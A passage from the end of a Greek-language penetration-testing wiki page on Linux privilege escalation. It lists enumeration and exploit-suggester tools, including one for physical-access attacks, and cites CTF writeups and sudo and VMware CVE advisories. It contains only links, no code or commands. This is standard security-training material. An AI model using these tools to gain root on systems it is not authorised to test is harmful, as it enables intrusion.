**Έλεγχος Unix Privesc:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Καταμέτρηση kernel vulns σε Linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Συλλογή περισσότερων scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (κλιμάκωση προνομίων μέσω Crontab UI, επαναχρησιμοποίηση creds με zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: πλαστό payload .text_sig για monitor που εκτελείται από cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: παράκαμψη Neighborhood Watch (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Βασική κλιμάκωση προνομίων Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Οδηγός κλιμάκωσης προνομίων Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Επίθεση και άμυνα: τεχνικές κλιμάκωσης προνομίων Linux του 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Κανείς δεν περιμένει την εκτέλεση εντολών!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (κλιμάκωση προνομίων Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Αναλυτική παρουσίαση εργαστηριακών ασκήσεων - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Συμβουλές και κόλπα για κλιμάκωση προνομίων Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Εργαλείο enumeration και κλιμάκωσης προνομίων Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Τι είναι ένα Socket;](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Συνδεθείτε στο D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Εκτελέσιμα SUID και κλιμάκωση προνομίων Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Μέρος 2 – Κλιμάκωση προνομίων Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Πώς να διαχειρίζεστε ACLs στο Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root σε Redhat/CentOS μέσω network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Τι είναι το systemd;](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection μέσω logs, συνολική αλυσίδα)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Εγχειρίδιο GNU Bash – BASH_ENV (αρχείο εκκίνησης για μη διαδραστική λειτουργία)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + κλιμάκωση προνομίων μέσω symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (αντιγραφή pg_basebackup μέσω cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Όπως κι αν το ονομάσετε, το VMware το αναβαθμίζει (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Κλιμάκωση προνομίων μέσω Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Ευπάθειες κλιμάκωσης προνομίων sudo CVE-2025-32462 και CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Κατάλογοι αποθετηρίων PYC](https://peps.python.org/pep-3147/)
- [32] [Τεκμηρίωση Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet του @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Καταγραφή κωδικών πρόσβασης στο Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Λεπτομέρειες για συνθήκη ανταγωνισμού στο logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
